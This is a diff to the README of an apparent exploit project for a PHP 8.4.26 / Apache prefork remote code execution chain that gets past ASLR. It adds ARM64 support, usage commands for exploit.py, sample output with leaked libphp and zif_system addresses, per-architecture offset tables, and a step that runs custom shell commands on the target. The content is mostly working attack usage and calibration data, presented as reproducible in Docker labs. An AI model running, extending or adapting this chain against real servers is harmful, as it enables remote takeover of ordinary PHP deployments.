@@ -25,6 +25,7 @@ cd php2shell-bypass-aslr-exp
 #    official php.ini-production to php.ini
 ./pure/run_pure.sh
 # target: OK
+# architecture: x86_64 (run exploit with --arch x86_64)
 # PHP 8.4.26 ...
 # display_errors => Off => Off
 # memory_limit => 128M => 128M
@@ -32,10 +33,11 @@ cd php2shell-bypass-aslr-exp
 
 # 2) One command: A1 -> B1 leak -> A2 -> B2 -> id
 python3 exploit.py --port 18110
+#       --arch auto (default): automatically detects x86_64 / aarch64
 #       pinned 150/150 workers (149 holders)
 # [try 1] A1: END-cleanup send_cookie OOM
 # [try 1] B1: stale-id OOB read (chunk base + libphp)
-#       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
+#       arch=x86_64 decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
 #       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
 #                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
 # [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
@@ -46,8 +48,11 @@ python3 exploit.py --port 18110
 No PHP/Apache compilation, no image build, no gdb, and no target ini changes.
 `pure/run_pure.sh` defaults to container `p2s-pure-18110` and port `18110`, and
 uses the official prefork configuration (MaxRequestWorkers=150); after startup it
-prints the effective ini and MPM values. `--single` mounts the single-worker
-`docker/apache.conf` instead (use it with `--workers 1`). On Linux without
+prints the actual architecture and the effective ini and MPM values. `--single`
+mounts the non-official single-worker override
+`pure/docker/apache-single-worker.conf` (use it with `--workers 1`).
+`docker/apache.conf` is a compatibility symlink for older harnesses and points
+to the same file. On Linux without
 docker-group permissions, the script automatically falls back to `sudo docker`;
 you can also explicitly run `DOCKER="sudo docker" ./pure/run_pure.sh`. `--dbg`
 only switches to the same build with debug symbols for offline calibration.
@@ -60,6 +65,9 @@ python3 exploit.py --port 18110 --restart p2s-pure-18110
 
 # Official workers are the default; a single-worker target started with --single uses --workers 1
 python3 exploit.py --port 18110 --workers 1
+
+# ARM64 can also be selected explicitly (the default --arch auto detects it automatically)
+python3 exploit.py --arch aarch64 --port 18110 --workers 1
 
 # Custom command: write a script into the mounted directory, then execute it with sh
 printf 'id; uname -a > /out/p1\n' > out/c
@@ -103,12 +111,15 @@ solely of chunked multipart and ordinary GET/POST requests:
 
 Offsets (this build, ASLR-independent):
 
-| Symbol/location | Value |
-|---|---|
-| `zval_ptr_dtor` | `libphp+0x65EB60` |
-| `zif_system` | `libphp+0x465370` |
-| fake array `S` | `main+0xF8398` |
-| A2 `hsv` | `main+0x7D720` |
+| Symbol/location | x86_64 | aarch64 |
+|---|---|---|
+| Leaked `zval_ptr_dtor` pointer | `libphp+0x65EB60` | `libphp+0x63812B` |
+| `zif_system` | `libphp+0x465370` | `libphp+0x42CD70` |
+| fake array `S` | `main+0xF8398` | `main+0xF8398` |
+| A2 `hsv` | `main+0x7D720` | `main+0x7D720` |
+
+On aarch64, the `zval_ptr_dtor` ELF symbol is at `0x638120`, but the pointer
+repeated in this leak is 11 bytes after it, so the profile subtracts `0x63812B`.
 
 Target environment: Debian 13 (trixie), Apache 2.4.69 prefork, PHP 8.4.26 NTS
 mod_php, files session handler. Changing the PHP build/version requires
@@ -122,6 +133,8 @@ start; the two leaks in the chain determine those addresses automatically.
 - Debug-image batch log: [pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
 - Official-image log: [pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
 - Official-worker log: [pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
+- Native ARM64 official-image log (10/10 fresh containers): [pure/evidence/arm64_stock_20261023.log](pure/evidence/arm64_stock_20261023.log)
+- Native ARM64 official-worker log (3/3 fresh containers): [pure/evidence/arm64_official_workers_20261023.log](pure/evidence/arm64_official_workers_20261023.log)
 - Proof: [pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)
 
 ## Legacy (not this target)
@@ -133,6 +146,12 @@ archived at [archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py).
 Documents in the same directory, such as
 [HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md) and
 [ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md), describe that earlier approach.
+The old `docker/php.ini`, `docker/docker-compose.yml`, `docker/offsets.py`, and
+`lab/apache2_aslr.conf` have also been archived under
+`archive/legacy-8m/docker/` and `archive/legacy-8m/lab/`.
+The actual single-worker configuration and target page are in `pure/docker/`
+(`apache-single-worker.conf` and `www/index.php`); `docker/` retains only the
+`apache.conf` and `www` compatibility symlinks pointing there.
 
 ## Reproduction statement
 
